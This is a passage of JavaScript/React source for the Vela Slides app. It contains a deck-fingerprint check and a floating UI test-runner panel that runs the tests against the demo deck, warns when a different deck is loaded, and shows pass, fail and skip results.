    const titleEl = _$$("header span").find((s) => {
      const fw = s.style?.fontWeight;
      return (fw === "700" || fw === 700 || fw === "bold") && s.textContent?.length > 1;
    });
    const liveTitle = titleEl?.textContent?.trim() || "";

    // Read slide count from DOM (e.g. "21sl" or slide counter "3 / 8")
    const statsEl = _$$("header span").find((s) => s.textContent?.includes("sl") && s.textContent?.includes("§"));
    let slideCount = 0;
    if (statsEl) {
      const m = statsEl.textContent.match(/(\d+)sl/);
      if (m) slideCount = parseInt(m[1]);
    }

    // Build fingerprint from live DOM state
    if (liveTitle) return `${liveTitle}|${slideCount}`;
    return null;
  } catch { return null; }
}

// Fingerprint: "title|slideCount" — matches demo deck as assembled
const DEMO_DECK_FP_TITLE = "Vela Slides \u2014 Live Demo";

function VelaUITestRunner() {
  const [running, setRunning] = useState(false);
  const [results, setResults] = useState(null);
  const [progress, setProgress] = useState(null);
  const [expanded, setExpanded] = useState(false);
  const [copied, setCopied] = useState(false);
  const [warning, setWarning] = useState(null);
  const [hasRun, setHasRun] = useState(false);

  const run = async (force) => {
    // Fingerprint check — only run against demo deck unless forced
    if (!force) {
      const fp = computeDeckFingerprint();
      const isDemo = fp && fp.startsWith(DEMO_DECK_FP_TITLE + "|");
      if (!isDemo) {
        setWarning({ fp: fp || "(unable to read deck)", expected: DEMO_DECK_FP_TITLE });
        return;
      }
    }
    setWarning(null);
    setRunning(true);
    setResults(null);
    setExpanded(true);
    const res = await runUITests((p) => setProgress(p));
    setResults(res);
    setRunning(false);
    setProgress(null);
    setHasRun(true);
  };

  // Ctrl+Alt+T or custom event triggers
  useEffect(() => {
    const keyHandler = (e) => {
      if (e.ctrlKey && e.altKey && e.key === "t") {
        e.preventDefault();
        if (!running) run();
      }
    };
    const eventHandler = () => { if (!running) run(); };
    window.addEventListener("keydown", keyHandler);
    window.addEventListener("vela-run-uitests", eventHandler);
    return () => { window.removeEventListener("keydown", keyHandler); window.removeEventListener("vela-run-uitests", eventHandler); };
  }, [running]);

  const copyResults = () => {
    if (!results) return;
    const passed = results.filter((r) => r.pass === true).length;
    const failed = results.filter((r) => r.pass === false).length;
    const skipped = results.filter((r) => r.pass === "skip").length;
    const lines = [
      `⛵ Vela UI Tests — v${VELA_VERSION}`,
      `${passed} passed, ${failed} failed, ${skipped} skipped, ${results.length} total`,
      `${new Date().toISOString()}`,
      "",
      ...results.map((r) => `${r.pass === true ? "✅" : r.pass === "skip" ? "⏭️" : "❌"} [${r.suite}] ${r.name} (${r.ms}ms)${r.error ? ` — ${r.error}` : ""}`),
    ];
    const text = lines.join("\n");
    velaClipboard(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  if (!results && !running && !warning) {
    // Show mini rerun button if tests have been run before
    if (!hasRun) return null;
    return (
      <div style={{ position: "fixed", bottom: 16, right: 16, zIndex: 99999 }}>
        <button onClick={() => run()} style={{ width: 36, height: 36, borderRadius: "50%", background: "rgba(15,23,42,0.9)", border: "1px solid rgba(99,102,241,0.4)", color: "#818cf8", fontSize: 16, cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", boxShadow: "0 4px 16px rgba(0,0,0,0.4)", backdropFilter: "blur(8px)" }} title="Re-run UI Tests (Ctrl+Alt+T)">🧪</button>
      </div>
    );
  }

  // Warning: wrong deck loaded
  if (warning && !running && !results) return (
    <div style={{ position: "fixed", bottom: 16, right: 16, zIndex: 99999, fontFamily: FONT.mono, maxWidth: 380 }}>
      <div style={{ borderRadius: 10, background: "rgba(15,23,42,0.97)", border: "1px solid rgba(251,191,36,0.5)", boxShadow: "0 8px 40px rgba(0,0,0,0.5)", backdropFilter: "blur(12px)", padding: "14px 16px" }}>
        <div style={{ fontSize: 12, fontWeight: 700, color: "#fbbf24", marginBottom: 8, display: "flex", alignItems: "center", gap: 6 }}>
          <span>⚠️</span> UI Tests — Wrong Deck
        </div>
        <div style={{ fontSize: 10, color: "#94a3b8", lineHeight: 1.6, marginBottom: 10 }}>
          UI tests are designed for the demo deck and may modify slides. Current deck doesn't match the expected fingerprint.
        </div>
        <div style={{ fontSize: 8, color: "#475569", marginBottom: 10, wordBreak: "break-all" }}>
          Current: {warning.fp || "(unknown)"}<br />
          Expected title: {warning.expected}
        </div>
        <div style={{ display: "flex", gap: 6 }}>
          <button onClick={() => run(true)} style={{ padding: "5px 12px", fontSize: 10, fontWeight: 700, background: "rgba(251,191,36,0.2)", border: "1px solid rgba(251,191,36,0.4)", borderRadius: 4, color: "#fbbf24", cursor: "pointer" }}>Run anyway</button>
          <button onClick={() => setWarning(null)} style={{ padding: "5px 12px", fontSize: 10, background: "rgba(255,255,255,0.1)", border: "1px solid rgba(255,255,255,0.15)", borderRadius: 4, color: "#94a3b8", cursor: "pointer" }}>Cancel</button>
        </div>
      </div>
    </div>
  );

  const passed = results?.filter((r) => r.pass === true).length || 0;
  const failed = results?.filter((r) => r.pass === false).length || 0;
  const skippedCount = results?.filter((r) => r.pass === "skip").length || 0;
  const total = results?.length || 0;
  const totalMs = results?.reduce((s, r) => s + r.ms, 0) || 0;

  // Group by suite
  const suites = {};
  (results || []).forEach((r) => {
    if (!suites[r.suite]) suites[r.suite] = [];
    suites[r.suite].push(r);
  });

  return (
    <div style={{ position: "fixed", bottom: 16, right: 16, zIndex: 99999, display: "flex", flexDirection: "column", alignItems: "flex-end", gap: 6, fontFamily: FONT.mono, maxWidth: 420 }}>
      {/* Live progress while running */}
      {running && progress && (
        <div style={{ borderRadius: 10, background: "rgba(15,23,42,0.97)", border: "1px solid rgba(59,130,246,0.5)", boxShadow: "0 8px 40px rgba(0,0,0,0.5)", backdropFilter: "blur(12px)", overflow: "hidden", maxWidth: 380, display: "flex", flexDirection: "column" }}>
          {/* Progress header */}
          <div style={{ padding: "10px 14px", display: "flex", alignItems: "center", gap: 8, borderBottom: "1px solid rgba(255,255,255,0.1)" }}>
            <span style={{ animation: "spin 1s linear infinite", display: "inline-block", fontSize: 14 }}>🧪</span>
            <span style={{ fontSize: 12, fontWeight: 700, color: "#fff" }}>{progress.done}/{progress.total}</span>
            <span style={{ fontSize: 10, color: "#34d399", fontWeight: 600 }}>✓ {progress.passed || 0}</span>
            {(progress.failed || 0) > 0 && <span style={{ fontSize: 10, color: "#f87171", fontWeight: 600 }}>✗ {progress.failed}</span>}
            {(progress.skipped || 0) > 0 && <span style={{ fontSize: 10, color: "#94a3b8", fontWeight: 600 }}>⏭️ {progress.skipped}</span>}
            <div style={{ flex: 1 }} />
            <span style={{ fontSize: 9, color: "rgba(255,255,255,0.4)" }}>{Math.round((progress.done / progress.total) * 100)}%</span>
          </div>
          {/* Progress bar */}
          <div style={{ height: 3, background: "rgba(255,255,255,0.1)" }}>
            <div style={{ height: "100%", background: (progress.failed || 0) > 0 ? "#f87171" : "#3b82f6", width: `${(progress.done / progress.total) * 100}%`, transition: "width 0.15s" }} />
          </div>
          {/* Current test */}
          <div style={{ padding: "6px 14px", fontSize: 10, color: "rgba(255,255,255,0.6)" }}>
            {progress.suite} → {progress.test}
          </div>
          {/* Live failures */}
          {progress.results && progress.results.filter((r) => r.pass === false).length > 0 && (
            <div style={{ maxHeight: 160, overflowY: "auto", padding: "0 14px 8px" }}>
              {progress.results.filter((r) => r.pass === false).map((r, i) => (
                <div key={i} style={{ fontSize: 10, color: "#f87171", padding: "3px 0", lineHeight: 1.4 }}>
                  ✗ <span style={{ fontWeight: 600 }}>[{r.suite}]</span> {r.name}
                  {r.error && <div style={{ fontSize: 9, color: "#f87171", opacity: 0.7, paddingLeft: 12 }}>↳ {r.error}</div>}
                </div>
              ))}
            </div>
          )}
        </div>
      )}

      {/* Results panel */}
      {results && (
        <div style={{ borderRadius: 10, background: "rgba(15,23,42,0.97)", border: `1px solid ${failed > 0 ? "rgba(239,68,68,0.5)" : "rgba(16,185,129,0.5)"}`, boxShadow: "0 8px 40px rgba(0,0,0,0.5)", backdropFilter: "blur(12px)", overflow: "hidden", maxHeight: expanded ? "80vh" : "auto", display: "flex", flexDirection: "column" }}>
          {/* Header */}
          <div onClick={() => setExpanded((v) => !v)} style={{ padding: "10px 14px", display: "flex", alignItems: "center", gap: 8, cursor: "pointer", borderBottom: expanded ? "1px solid rgba(255,255,255,0.1)" : "none" }}>
            <span style={{ fontSize: 14 }}>{failed > 0 ? "❌" : "✅"}</span>
            <span style={{ fontSize: 12, fontWeight: 700, color: "#fff" }}>UI Tests: {passed}/{total}</span>
            {skippedCount > 0 && <span style={{ fontSize: 9, color: "#94a3b8", fontWeight: 600 }}>⏭️ {skippedCount} skipped</span>}
            <span style={{ fontSize: 9, color: "rgba(255,255,255,0.5)" }}>{(totalMs / 1000).toFixed(1)}s · v{VELA_VERSION}</span>
            <div style={{ flex: 1 }} />
            <button onClick={(e) => { e.stopPropagation(); copyResults(); }} style={{ background: "rgba(255,255,255,0.15)", border: "1px solid rgba(255,255,255,0.2)", color: "#fff", padding: "2px 8px", borderRadius: 4, cursor: "pointer", fontSize: 9, fontFamily: FONT.mono }}>{copied ? "Copied!" : "📋"}</button>
            <button onClick={(e) => { e.stopPropagation(); run(); }} style={{ background: "rgba(255,255,255,0.15)", border: "1px solid rgba(255,255,255,0.2)", color: "#fff", padding: "2px 8px", borderRadius: 4, cursor: "pointer", fontSize: 9, fontFamily: FONT.mono }}>🔄</button>
            <button onClick={(e) => { e.stopPropagation(); setResults(null); setExpanded(false); }} style={{ background: "none", border: "none", color: "rgba(255,255,255,0.4)", cursor: "pointer", fontSize: 12, padding: "0 2px" }}>✕</button>
          </div>

          {/* Expanded results */}
          {expanded && (
            <div style={{ overflowY: "auto", maxHeight: "60vh", padding: "6px 0" }}>
              {Object.entries(suites).map(([name, tests]) => {
                const suiteFailed = tests.filter((t) => t.pass === false).length;
                const suiteSkipped = tests.filter((t) => t.pass === "skip").length;
                const suitePassed = suiteFailed === 0;
                return (
                  <div key={name} style={{ padding: "4px 14px" }}>
                    <div style={{ fontSize: 10, fontWeight: 700, color: suitePassed ? "#34d399" : "#f87171", padding: "4px 0", display: "flex", alignItems: "center", gap: 6 }}>
                      <span>{suitePassed ? "✅" : "❌"}</span>
                      <span>{name}</span>
                      <span style={{ fontSize: 8, color: "rgba(255,255,255,0.3)" }}>{tests.length} tests{suiteFailed > 0 ? `, ${suiteFailed} failed` : ""}{suiteSkipped > 0 ? `, ${suiteSkipped} skipped` : ""}</span>
                    </div>
                    {tests.map((t, i) => (
                      <div key={i} style={{ fontSize: 9, padding: "2px 0 2px 18px", color: t.pass === true ? "rgba(255,255,255,0.5)" : t.pass === "skip" ? "#94a3b8" : "#f87171", lineHeight: 1.5 }}>
                        {t.pass === true ? "✓" : t.pass === "skip" ? "⏭️" : "✗"} {t.name} <span style={{ color: "rgba(255,255,255,0.2)" }}>{t.ms}ms</span>
                        {t.error && <div style={{ color: t.pass === "skip" ? "#94a3b8" : "#f87171", fontSize: 8, paddingLeft: 12 }}>↳ {t.error}</div>}
                      </div>
                    ))}
                  </div>
                );
              })}
            </div>
          )}
        </div>
      )}
    </div>
  );
}
